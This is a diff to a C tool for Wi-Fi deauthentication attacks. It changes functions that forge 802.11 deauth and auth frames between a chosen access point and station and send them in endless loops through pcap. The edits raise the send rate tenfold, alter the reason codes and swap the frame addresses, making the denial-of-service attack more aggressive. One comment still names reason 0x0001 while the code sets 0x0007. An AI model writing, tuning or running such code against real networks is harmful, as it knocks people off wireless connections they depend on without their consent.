@@ -91,9 +91,9 @@ int deauth_attack_station(const char* interface, const char* ap_mac, const char*
 
     // add fix param: deauth reason - unspecified reason (0x0001);
     deAuthFixParam fix_param;
-    fix_param.reason_code = 0x0003;
+    fix_param.reason_code = 0x0007;
     memcpy((uint8_t*)frame_to_ap + sizeof(Frame), &fix_param, sizeof(deAuthFixParam));
-    fix_param.reason_code = 0x0001;
+    fix_param.reason_code = 0x0007;
     memcpy((uint8_t*)frame_to_sta + sizeof(Frame), &fix_param, sizeof(deAuthFixParam));
 
 
@@ -111,7 +111,7 @@ int deauth_attack_station(const char* interface, const char* ap_mac, const char*
         pcap_sendpacket(handle, (unsigned char*)frame_to_sta, sizeof(Frame) + sizeof(deAuthFixParam));
         puts("send station's deauth frame to ap");
         puts("send ap's deauth frame to station");
-        usleep(500000);
+        usleep(50000);
     }
 
     free(frame_to_ap);
@@ -146,7 +146,7 @@ int deauth_attack_auth(const char* interface, const char* ap_mac, const char* st
     Frame* frame = calloc(sizeof(Frame) + sizeof(AuthFixParam), 1);
 
     // addr1(DA): AP, addr2(SA): Station, addr3(BSSID): AP
-    createFrame(frame, 0xb000, sta, ap, ap);
+    createFrame(frame, 0xb000, ap, sta, ap);
 
     // add fix param: deauth reason - unspecified reason (0x0001);
     AuthFixParam fix_param;
@@ -167,7 +167,7 @@ int deauth_attack_auth(const char* interface, const char* ap_mac, const char* st
     while(1) {
         pcap_sendpacket(handle, (unsigned char*)frame, sizeof(Frame) + sizeof(AuthFixParam));
         puts("send station's auth frame to ap");
-        usleep(500000);
+        sleep(1);
     }
 
     free(frame);
